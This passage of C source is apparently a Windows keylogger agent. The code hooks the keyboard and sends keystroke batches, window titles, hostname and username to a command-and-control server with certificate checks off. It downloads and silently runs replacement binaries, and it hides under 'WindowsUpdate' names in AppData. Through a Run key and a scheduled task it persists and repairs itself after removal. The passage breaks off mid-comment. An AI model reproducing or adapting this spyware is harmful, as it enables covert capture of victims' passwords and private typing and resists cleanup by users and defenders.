    DWORD flags = g_use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", wpath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return -1;
    }

    if (g_use_https) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                         &sec_flags, sizeof(sec_flags));
    }

    BOOL ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  NULL, 0, 0, 0);
    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

    if (ok && response && resp_size > 0) {
        DWORD avail, read;
        int total = 0;
        response[0] = '\0';
        while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
            DWORD to_read = avail;
            if (total + (int)to_read >= resp_size) to_read = resp_size - total - 1;
            if (WinHttpReadData(hRequest, response + total, to_read, &read)) {
                total += read;
                response[total] = '\0';
            } else {
                break;
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return (ok && response) ? (int)strlen(response) : (ok ? 0 : -1);
}

/* ============================================================================
 * SECTION 10: C2 OPERATIONS
 * ============================================================================ */

static void c2_register(void) {
    char hostname[256] = {0};
    char username[256] = {0};
    DWORD sz = sizeof(hostname);
    GetComputerNameA(hostname, &sz);
    sz = sizeof(username);
    GetUserNameA(username, &sz);

    /* get OS version info */
    char os_ver[128];
    OSVERSIONINFOA ovi = {0};
    ovi.dwOSVersionInfoSize = sizeof(ovi);
    char arch[8] = "x86";
#ifdef _WIN64
    strcpy(arch, "x64");
#endif
    /*
     * We avoid GetVersionExA (deprecated/manifest-gated).
     * Use RtlGetVersion via ntdll or just report a static string.
     * For our purposes, a simple string is sufficient.
     */
    snprintf(os_ver, sizeof(os_ver), "Windows %s", arch);

    /* get local IP */
    char local_ip[64] = "0.0.0.0";
    char host_buf[NI_MAXHOST];
    if (gethostname(host_buf, sizeof(host_buf)) == 0) {
        struct hostent *he = gethostbyname(host_buf);
        if (he && he->h_addrtype == AF_INET) {
            struct in_addr addr;
            memcpy(&addr, he->h_addr_list[0], sizeof(addr));
            strncpy(local_ip, inet_ntoa(addr), sizeof(local_ip) - 1);
        }
    }

    char body[2048];
    snprintf(body, sizeof(body),
             "{\"hostname\":\"%s\","
             "\"username\":\"%s\","
             "\"os_version\":\"%s\","
             "\"ip_address\":\"%s\","
             "\"architecture\":\"%s\"}",
             hostname, username, os_ver, local_ip, arch);

    char response[4096] = {0};
    int ret = http_post("/api/agents/register", body, response, sizeof(response));

    if (ret > 0) {
        /* extract agent_id from response JSON */
        if (json_extract_string(response, "agent_id", g_agent_id, AGENT_ID_LEN)) {
            g_agent_registered = 1;

            /* save the agent_id back to config */
            char config_path[MAX_PATH];
            GetModuleFileNameA(NULL, config_path, MAX_PATH);
            char *slash = strrchr(config_path, '\\');
            if (slash) {
                *(slash + 1) = '\0';
                strcat(config_path, "agent_config.json");
                config_save_agent_id(config_path);
            }

            log_write("c2: registered successfully");
        }

        /* update intervals from server */
        int val;
        if (json_extract_int(response, "exfil_interval_seconds", &val))
            g_exfil_interval_sec = val;
        if (json_extract_int(response, "heartbeat_interval_seconds", &val))
            g_heartbeat_interval_sec = val;

        log_write("c2: config received from server");
    } else {
        log_write("c2: registration failed — will retry");
    }
}

static void c2_exfil(void) {
    KeyEvent batch_buffer[BUFFER_SIZE];
    int count = buffer_flush(batch_buffer, 500);   /* max 500 per batch */

    if (count == 0) return;

    /* build JSON body */
    char *body = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_JSON_BODY);
    if (!body) return;

    if (!json_build_keystroke_batch(body, MAX_JSON_BODY, batch_buffer, count)) {
        /* JSON too large — drop events rather than re-queue
         * (re-queuing outside the CS races with concurrent flushes) */
        HeapFree(GetProcessHeap(), 0, body);
        log_write("c2: exfil — batch dropped (json overflow)");
        return;
    }

    int ret = http_post("/api/keystrokes", body, NULL, 0);
    HeapFree(GetProcessHeap(), 0, body);

    if (ret < 0) {
        /* network failure — events are lost rather than risking
         * buffer corruption via racy re-queue */
        log_write("c2: exfil failed — events dropped");
    }
}

static void c2_heartbeat(void) {
    LONG keys = InterlockedExchange(&g_keys_since_heartbeat, 0);
    DWORD uptime = (GetTickCount() - g_startup_ticks) / 1000;

    char body[1024];
    snprintf(body, sizeof(body),
             "{\"agent_id\":\"%s\","
             "\"version\":\"" AGENT_VERSION "\","
             "\"keystrokes_since_last\":%ld,"
             "\"uptime_seconds\":%lu,"
             "\"status\":\"active\"}",
             g_agent_id, keys, uptime);

    char response[2048] = {0};
    int ret = http_post("/api/agents/heartbeat", body, response, sizeof(response));

    if (ret > 0) {
        /* check for remote actions */
        char action[32] = {0};
        if (json_extract_string(response, "action", action, sizeof(action))) {
            if (stricmp_local(action, "uninstall") == 0) {
                persistence_uninstall();
                log_write("c2: uninstall — persistence removed, exiting");
                PostQuitMessage(0);
            } else if (stricmp_local(action, "update_config") == 0) {
                /* config will be polled on next cycle */
                log_write("c2: update_config command received");
            } else if (stricmp_local(action, "sleep") == 0) {
                /* TODO: suspend hook temporarily */
                log_write("c2: sleep command received");
            }
        }

        /* check if server wants us to update */
        char update_url[MAX_URL_LEN] = {0};
        if (json_extract_string(response, "update_url", update_url, sizeof(update_url))) {
            char update_sha256[65] = {0};
            if (!json_extract_string(response, "update_sha256", update_sha256, sizeof(update_sha256))) {
                log_write("c2: update_url present but update_sha256 missing or invalid");
            }
            c2_update(update_url, update_sha256);
            /* c2_update calls PostQuitMessage — we will not return here */
            return;
        }

        /* check if server has new config */
        int changed = 0;
        if (json_extract_bool(response, "config_changed", &changed) && changed) {
            c2_config_poll();
        }
    } else {
        log_write("c2: heartbeat failed");
    }
}

/* ============================================================================
 * SECTION 10b: AUTO-UPDATE
 *
 * Triggered by the C2 during heartbeat.  Server replies with:
 *   { "update_url": "https://...", "update_sha256": "hex..." }
 *
 * The agent downloads the new binary, verifies the SHA-256 hash,
 * installs it via VBS swap (instant, no window) with a MoveFileEx
 * fallback (next reboot), then exits so the new binary takes over.
 * ============================================================================ */

/*
 * Compute SHA-256 of a buffer.  Uses Windows CryptoAPI (in advapi32, already
 * linked).  Returns 0 on failure, 1 on success.  On success hex_out must be
 * at least 65 bytes.
 */
static int sha256_hex(const BYTE *data, DWORD len, char *hex_out, int hex_size) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE hash[32];
    DWORD hash_len = sizeof(hash);
    int ok = 0;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        goto done;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
        goto done;
    if (!CryptHashData(hHash, data, len, 0))
        goto done;
    if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hash_len, 0))
        goto done;

    for (int i = 0; i < 32 && hex_size > 2; i++) {
        snprintf(hex_out + i * 2, 3, "%02x", hash[i]);
    }
    hex_out[64] = '\0';
    ok = 1;

done:
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    return ok;
}

/*
 * Write the VBS updater script to %TEMP%.  It loops waiting for the agent
 * process to exit, then copies the new binary over the old one, relaunches,
 * and self-deletes.  wscript.exe //B runs it invisibly.
 */
static int write_updater_vbs(const char *vbs_path,
                              const char *new_exe_path,
                              const char *target_exe_path) {
    HANDLE hf = CreateFileA(vbs_path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;

    /*
     * VBS script logic:
     *   - Sleep 500ms so the agent has time to exit
     *   - Loop until the target exe is no longer locked (agent exited)
     *   - Copy new exe over target
     *   - Launch target
     *   - Self-delete
     */
    const char *script =
        "On Error Resume Next\r\n"
        "Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n"
        "Set shell = CreateObject(\"WScript.Shell\")\r\n"
        "target = \"";

    DWORD written;
    WriteFile(hf, script, strlen(script), &written, NULL);

    WriteFile(hf, target_exe_path, strlen(target_exe_path), &written, NULL);

    const char *mid =
        "\"\r\n"
        "newfile = \"";
    WriteFile(hf, mid, strlen(mid), &written, NULL);

    WriteFile(hf, new_exe_path, strlen(new_exe_path), &written, NULL);

    /* Chr(34) = double-quote — avoids VBS quote-counting nightmares */
    const char *tail =
        "\"\r\n"
        "WScript.Sleep 500\r\n"
        "copied = False\r\n"
        "For i = 1 To 20\r\n"
        "    If fso.FileExists(newfile) Then\r\n"
        "        fso.CopyFile newfile, target, True\r\n"
        "        If Err.Number = 0 Then\r\n"
        "            copied = True\r\n"
        "            Exit For\r\n"
        "        End If\r\n"
        "        Err.Clear\r\n"
        "    End If\r\n"
        "    WScript.Sleep 500\r\n"
        "Next\r\n"
        "If copied Then\r\n"
        "    q = Chr(34)\r\n"
        "    shell.Run q & target & q, 0, False\r\n"
        "End If\r\n"
        "fso.DeleteFile WScript.ScriptFullName, True\r\n";

    WriteFile(hf, tail, strlen(tail), &written, NULL);
    CloseHandle(hf);
    return 1;
}

/*
 * Download a full replacement binary from the C2, verify its hash,
 * install it, and signal shutdown so the new version takes over.
 */
static void c2_update(const char *url, const char *expected_sha256) {
    log_write("update: starting download");

    /* --- Step 1: download the new binary --- */
    BYTE *payload = (BYTE*)HeapAlloc(GetProcessHeap(), 0, UPDATE_MAX_SIZE);
    if (!payload) {
        log_write("update: out of memory");
        return;
    }

    /* parse URL into host + port + path (like config_load does) */
    char host[MAX_HOST_LEN] = {0};
    int port = 443;
    int use_https = 1;
    char uri_path[MAX_PATH_LEN] = "/";

    const char *url_p = url;
    if (strncmp(url_p, "https://", 8) == 0) { url_p += 8; port = 443; use_https = 1; }
    else if (strncmp(url_p, "http://", 7) == 0) { url_p += 7; port = 80; use_https = 0; }

    const char *slash3 = strchr(url_p, '/');
    if (slash3) {
        int hlen = (int)(slash3 - url_p);
        if (hlen >= MAX_HOST_LEN) hlen = MAX_HOST_LEN - 1;
        memcpy(host, url_p, hlen);
        strncpy(uri_path, slash3, MAX_PATH_LEN - 1);
    } else {
        strncpy(host, url_p, MAX_HOST_LEN - 1);
    }

    WCHAR whost[MAX_HOST_LEN], wpath[MAX_PATH_LEN];
    MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, MAX_HOST_LEN);
    MultiByteToWideChar(CP_UTF8, 0, uri_path, -1, wpath, MAX_PATH_LEN);

    HINTERNET hSession = WinHttpOpen(L"Ghostnet-Updater/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto fail;

    HINTERNET hConnect = WinHttpConnect(hSession, whost, (INTERNET_PORT)port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); goto fail; }

    DWORD wflags = use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", wpath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, wflags);
    if (!hReq) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); goto fail; }

    if (use_https) {
        DWORD sf = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &sf, sizeof(sf));
    }

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0))
        { WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); goto fail; }
    if (!WinHttpReceiveResponse(hReq, NULL))
        { WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); goto fail; }

    DWORD total = 0;
    DWORD avail, read;
    while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
        DWORD to_read = avail;
        if (total + to_read > UPDATE_MAX_SIZE) to_read = UPDATE_MAX_SIZE - total;
        if (!WinHttpReadData(hReq, payload + total, to_read, &read)) break;
        total += read;
        if (total >= UPDATE_MAX_SIZE) break;
    }

    /* if we hit the size cap, check if more data remains — truncated */
    if (total >= UPDATE_MAX_SIZE) {
        DWORD extra;
        if (WinHttpQueryDataAvailable(hReq, &extra) && extra > 0) {
            WinHttpCloseHandle(hReq);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            log_write("update: binary exceeds max size — discarding");
            goto fail;
        }
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (total == 0) {
        log_write("update: download empty or failed");
        goto fail;
    }
    log_write("update: downloaded successfully");

    /* --- Step 2: verify SHA-256 --- */
    if (expected_sha256 && expected_sha256[0]) {
        char computed[65];
        if (!sha256_hex(payload, total, computed, sizeof(computed))) {
            log_write("update: hash computation failed");
            goto fail;
        }
        if (stricmp_local(computed, expected_sha256) != 0) {
            log_write("update: hash mismatch — discarding");
            goto fail;
        }
        log_write("update: hash verified");
    }

    /* --- Step 3: write new binary to a temp location --- */
    char temp_dir[MAX_PATH], new_exe[MAX_PATH];
    if (GetTempPathA(sizeof(temp_dir), temp_dir) == 0)
        strcpy(temp_dir, "C:\\Windows\\Temp\\");
    snprintf(new_exe, sizeof(new_exe), "%sWindowsUpdate.new", temp_dir);
    /* .new extension — Windows won't try to execute it accidentally */

    HANDLE hOut = CreateFileA(new_exe, GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        log_write("update: cannot write new binary");
        goto fail;
    }
    DWORD wr;
    WriteFile(hOut, payload, total, &wr, NULL);
    CloseHandle(hOut);
    HeapFree(GetProcessHeap(), 0, payload);  /* no longer needed */

    /* --- Step 4: get the current exe path (the one to replace) --- */
    char current_exe[MAX_PATH];
    GetModuleFileNameA(NULL, current_exe, sizeof(current_exe));

    /*
     * If we're running from the persisted copy, we can replace it directly.
     * If running from a one-off location, we still need to update the persisted
     * copy — the scheduled task / Run key points there.
     */
    char dummy1[MAX_PATH], dummy2[MAX_PATH];
    char persist_exe_actual[MAX_PATH], dummy3[MAX_PATH];
    persistence_paths(dummy1, sizeof(dummy1), dummy2, sizeof(dummy2),
                      persist_exe_actual, sizeof(persist_exe_actual),
                      dummy3, sizeof(dummy3));

    /* the target to replace: prefer the persisted copy if it exists */
    char target_exe[MAX_PATH];
    if (GetFileAttributesA(persist_exe_actual) != INVALID_FILE_ATTRIBUTES) {
        strncpy(target_exe, persist_exe_actual, sizeof(target_exe) - 1);
        target_exe[sizeof(target_exe) - 1] = '\0';
    } else {
        strncpy(target_exe, current_exe, sizeof(target_exe) - 1);
        target_exe[sizeof(target_exe) - 1] = '\0';
    }

    /* --- Step 5: schedule MoveFileEx fallback (survives if VBS fails) --- */
    MoveFileExA(new_exe, target_exe, MOVEFILE_REPLACE_EXISTING |
                                     MOVEFILE_DELAY_UNTIL_REBOOT);
    log_write("update: MoveFileEx fallback scheduled");

    /* --- Step 6: write and spawn the VBS updater --- */
    char vbs_path[MAX_PATH];
    snprintf(vbs_path, sizeof(vbs_path), "%sWindowsUpdate.vbs", temp_dir);

    if (write_updater_vbs(vbs_path, new_exe, target_exe)) {
        /* launch wscript.exe //B (no banner, no window, no console) */
        char run_cmd[1024];
        snprintf(run_cmd, sizeof(run_cmd),
                 "wscript.exe //B //Nologo \"%s\"", vbs_path);

        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {0};
        if (CreateProcessA(NULL, run_cmd, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW | DETACHED_PROCESS,
                           NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            log_write("update: VBS updater spawned — exiting for swap");
        } else {
            log_write("update: failed to spawn VBS updater");
        }
    }

    /* --- Step 7: flush buffer and exit --- */
    /* skip c2_exfil() — http_post may block long enough to race VBS timeout */
    PostQuitMessage(0);
    return;

fail:
    if (payload) HeapFree(GetProcessHeap(), 0, payload);
    log_write("update: failed");
}

static void c2_config_poll(void) {
    if (!g_agent_registered) return;

    char path[256];
    snprintf(path, sizeof(path), "/api/agents/%s/config", g_agent_id);

    char response[4096] = {0};
    int ret = http_get(path, response, sizeof(response));

    if (ret > 0) {
        int val;
        if (json_extract_int(response, "exfil_interval_seconds", &val))
            g_exfil_interval_sec = val;
        if (json_extract_int(response, "heartbeat_interval_seconds", &val))
            g_heartbeat_interval_sec = val;

        /* update server blacklist */
        const char *arr = json_array_next(response, "blacklist", g_blacklist[0], MAX_BLACKLIST_STRLEN);
        if (arr) {
            int idx = 0;
            char item[MAX_BLACKLIST_STRLEN];
            const char *p = arr;
            while (idx < MAX_BLACKLIST &&
                   (p = json_array_get_next(p, item, MAX_BLACKLIST_STRLEN)) != NULL) {
                if (item[0]) {
                    strncpy(g_blacklist[idx], item, MAX_BLACKLIST_STRLEN - 1);
                    idx++;
                }
                if (!p || *p == ']') break;
            }
            g_blacklist_count = idx;
        }

        log_write("c2: config polled successfully");
    }
}

/* ============================================================================
 * SECTION 11: MULTI-VECTOR PERSISTENCE
 *
 * Vectors (defense in depth — if one is removed, others survive):
 *   1. Scheduled Task    — fires at user logon (ONLOGON, no admin needed)
 *   2. Registry Run      — fires at user logon (HKCU, no admin needed)
 *   3. Mutex watchdog    — prevents double-run, task re-launches if process dies
 *
 * All vectors operate at user privilege level — no UAC prompt, no admin
 * rights required. The agent runs with the same permissions as the user
 * session, which is sufficient for WH_KEYBOARD_LL keyboard hooking.
 *
 * Startup repair runs on a 15-min timer to re-apply any vector that was
 * removed by AV, IT policy, or user cleanup.
 * ============================================================================ */

/*
 * Check if another instance is already running via a named mutex.
 * Returns 1 if this is the only instance (OK to proceed).
 * Returns 0 if another instance is running (exit).
 */
static int mutex_acquire(void) {
    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (hMutex == NULL) return 0;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0;
    }
    /* mutex is held for the lifetime of this process — never release */
    return 1;
}

/*
 * Get the paths we use for persistence.
 */
static void persistence_paths(char *original_exe, int orig_size,
                               char *persist_dir, int dir_size,
                               char *persist_exe, int exe_size,
                               char *persist_config, int cfg_size) {
    GetModuleFileNameA(NULL, original_exe, orig_size);

    char appdata[MAX_PATH];
    appdata[0] = '\0';

    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK) {
        /* fallback: use %USERPROFILE% or C:\Users\Public */
        ExpandEnvironmentStringsA("%USERPROFILE%", appdata, MAX_PATH);
        if (appdata[0] == '\0') {
            /* last resort */
            strcpy(appdata, "C:\\Users\\Public");
        }
    }

    snprintf(persist_dir, dir_size, "%s\\Microsoft\\Windows", appdata);
    snprintf(persist_exe, exe_size, "%s\\WindowsUpdate.exe", persist_dir);
    snprintf(persist_config, cfg_size, "%s\\agent_config.json", persist_dir);
}

/* ---- Vector 1: Registry Run (HKCU) ---- */

static int persistence_registry_install(const char *persist_exe) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,
                                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
    if (result != ERROR_SUCCESS) return 0;

    /* check if already set correctly */
    char current_val[MAX_PATH] = {0};
    DWORD val_size = sizeof(current_val);
    DWORD val_type = 0;
    result = RegQueryValueExA(hKey, REG_VALUE_NAME, NULL, &val_type,
                              (BYTE*)current_val, &val_size);
    if (result == ERROR_SUCCESS && val_type == REG_SZ &&
        strcmp(current_val, persist_exe) == 0) {
        RegCloseKey(hKey);
        return 1;
    }

    result = RegSetValueExA(hKey, REG_VALUE_NAME, 0, REG_SZ,
                            (BYTE*)persist_exe, strlen(persist_exe) + 1);
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS) ? 1 : 0;
}

static void persistence_registry_remove(void) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, REG_VALUE_NAME);
        RegCloseKey(hKey);
    }
}

/* ---- Vector 2: Scheduled Task (SYSTEM startup + watchdog re-trigger) ---- */

static int persistence_schtask_install(const char *persist_exe) {
    /*
     * Check if the task already exists by querying it.
     * schtasks /query returns exit code 0 if found, 1 if not.
     */
    char query_cmd[1024];
    snprintf(query_cmd, sizeof(query_cmd),
             "schtasks /query /tn \"WindowsUpdateTask\" >nul 2>&1");

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead = NULL, hWrite = NULL;
    DWORD exit_code = 1;

    if (CreatePipe(&hRead, &hWrite, &sa, 0)) {
        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {0};
        char cmdline[1024];
        snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", query_cmd);

        if (CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 5000);
            GetExitCodeProcess(pi.hProcess, &exit_code);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        CloseHandle(hWrite);
        CloseHandle(hRead);
    }

    if (exit_code == 0) return 1;  /* already exists */

    /*
     * Create the scheduled task (no admin required).
     *
     * /sc ONLOGON  — fires when the current user logs in (no elevation needed,
     *                unlike ONSTART which requires admin/SYSTEM rights).
     * /f           — force overwrite if somehow exists.
     *
     * We intentionally omit /rl HIGHEST — it would trigger UAC and fail
     * silently when the process is not elevated. The agent runs with user-
     * level privileges, which is sufficient for WH_KEYBOARD_LL.
     */
    char create_cmd[2048];
    snprintf(create_cmd, sizeof(create_cmd),
             "schtasks /create /tn \"WindowsUpdateTask\" "
             "/tr \"\\\"%s\\\"\" "
             "/sc ONLOGON "
             "/delay 0001:00 "
             "/f",
             persist_exe);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    if (CreateProcessA(NULL, create_cmd, NULL, NULL, FALSE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        DWORD code;
        GetExitCodeProcess(pi.hProcess, &code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        if (code == 0) {
            log_write("persistence: scheduled task created");
            return 1;
        }
    }

    log_write("persistence: scheduled task creation failed");
    return 0;
}

static void persistence_schtask_remove(void) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "schtasks /delete /tn \"WindowsUpdateTask\" /f");
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

/* ---- Vector 3: File copy to AppData ---- */

static int persistence_file_copy(const char *original_exe,
                                  const char *persist_dir,
                                  const char *persist_exe,
                                  const char *persist_config) {
    CreateDirectoryA(persist_dir, NULL);

    /*
     * Copy the exe. Using CopyFileA with FALSE (fail if exists) because
     * a running exe can't be overwritten on Windows. The repair cycle
     * will retry on next boot when nothing is holding the lock.
     */
    if (!CopyFileA(original_exe, persist_exe, FALSE)) {
        DWORD attrs = GetFileAttributesA(persist_exe);
        if (attrs == INVALID_FILE_ATTRIBUTES) {
            log_write("persistence: failed to copy exe to AppData");
            return 0;
        }
        /* file exists (from previous install) — OK, skip copy */
    }

    /* copy config alongside */
    char src_config[MAX_PATH];
    strncpy(src_config, original_exe, MAX_PATH - 1);
    char *slash2 = strrchr(src_config, '\\');
    if (slash2) {
        *(slash2 + 1) = '\0';
        strcat(src_config, "agent_config.json");
        if (GetFileAttributesA(src_config) != INVALID_FILE_ATTRIBUTES) {
            if (!CopyFileA(src_config, persist_config, FALSE)) {
                /* ignore if dest exists (locked/current), log if truly failed */
                if (GetFileAttributesA(persist_config) == INVALID_FILE_ATTRIBUTES) {
                    log_write("persistence: config copy failed");
                }
            }
        }
    }

    return 1;
}

/* ---- Startup repair (re-applies all vectors on a background thread) ---- */

static DWORD WINAPI persistence_repair_thread(LPVOID param) {
    (void)param;

    char orig_path[MAX_PATH], dir[MAX_PATH], exe[MAX_PATH], cfg[MAX_PATH];
    persistence_paths(orig_path, sizeof(orig_path),
                       dir, sizeof(dir), exe, sizeof(exe), cfg, sizeof(cfg));

    int ok = 1;
    if (!persistence_file_copy(orig_path, dir, exe, cfg)) ok = 0;
    if (!persistence_registry_install(exe)) ok = 0;
    if (!persistence_schtask_install(exe)) ok = 0;

    if (!ok) {
        log_write("persistence: repair — some vectors could not be restored");
    }

    return 0;
}

/* ---- Full uninstall (called on C2 uninstall command) ---- */

static void persistence_uninstall(void) {
    persistence_registry_remove();
    persistence_schtask_remove();

    char orig_path[MAX_PATH], dir[MAX_PATH], exe[MAX_PATH], cfg[MAX_PATH];
    persistence_paths(orig_path, sizeof(orig_path),
                       dir, sizeof(dir), exe, sizeof(exe), cfg, sizeof(cfg));

    /* schedule deletion on next reboot (can't delete running exe) */
    MoveFileExA(exe, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    MoveFileExA(cfg, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

    log_write("persistence: uninstall complete — all vectors removed");
}

/* ---- Main install (called once on startup) ---- */

static void persistence_install(void) {
    char orig_path[MAX_PATH], dir[MAX_PATH], exe[MAX_PATH], cfg[MAX_PATH];
    persistence_paths(orig_path, sizeof(orig_path),
                       dir, sizeof(dir), exe, sizeof(exe), cfg, sizeof(cfg));

    persistence_file_copy(orig_path, dir, exe, cfg);
    persistence_registry_install(exe);
    persistence_schtask_install(exe);

    log_write("persistence: all vectors installed");
}

/* ============================================================================
 * SECTION 12: KEYBOARD HOOK
 * ============================================================================ */

static HHOOK g_hook = NULL;
static char g_last_window[MAX_WINDOW_TITLE] = {0};
static DWORD g_last_process_id = 0;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;

            /* get window context */
            char window_title[MAX_WINDOW_TITLE];
            char process_name[MAX_PROCESS_NAME];
            DWORD process_id;
            capture_window_context(window_title, sizeof(window_title),
                                    process_name, sizeof(process_name),
                                    &process_id);

            /* check blacklist */
            if (window_title[0] && is_blacklisted(window_title)) {
                goto done;
            }

            buffer_push(kb->vkCode, kb->flags, window_title, process_name, process_id);

            /* update last-seen window */
            strncpy(g_last_window, window_title, MAX_WINDOW_TITLE - 1);
            g_last_window[MAX_WINDOW_TITLE - 1] = '\0';
            g_last_process_id = process_id;
        }
    }
done:
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

static int hook_install(void) {
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc,
                               GetModuleHandle(NULL), 0);
    if (!g_hook) {
        log_write("hook: SetWindowsHookEx failed");
        return 0;
    }
    log_write("hook: installed successfully");
    return 1;
}

static void hook_uninstall(void) {
    if (g_hook) {
        UnhookWindowsHookEx(g_hook);
        g_hook = NULL;
        log_write("hook: uninstalled");
    }
}

/* ============================================================================
 * SECTION 13: WINDOW PROCEDURE & MESSAGE LOOP
 * ============================================================================ */

#define WINDOW_CLASS L"MsgWnd_8a7f3c2e"

LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_TIMER:
            switch (wParam) {
                case TIMER_EXFIL:
                    if (g_agent_registered) c2_exfil();
                    break;
                case TIMER_HEARTBEAT:
                    if (g_agent_registered) c2_heartbeat();
                    break;
                case TIMER_CONFIG_POLL:
                    if (g_agent_registered) c2_config_poll();
                    break;
                case TIMER_REPAIR: {
                    /* run repair on a background thread so we don't
                     * block the message loop (schtasks can take seconds) */
                    HANDLE hThread = CreateThread(NULL, 0,
                        persistence_repair_thread, NULL, 0, NULL);
                    if (hThread) CloseHandle(hThread);  /* detach */
                    break;
                }
            }
            return 0;

        case WM_QUERYENDSESSION:
            /*
             * System is shutting down. We only get ~5 seconds.
             * Skip the full exfil (HTTP round-trip takes too long) and
             * instead write pending keystrokes to a local dump file so
             * nothing is lost. On next startup, re-send from the dump.
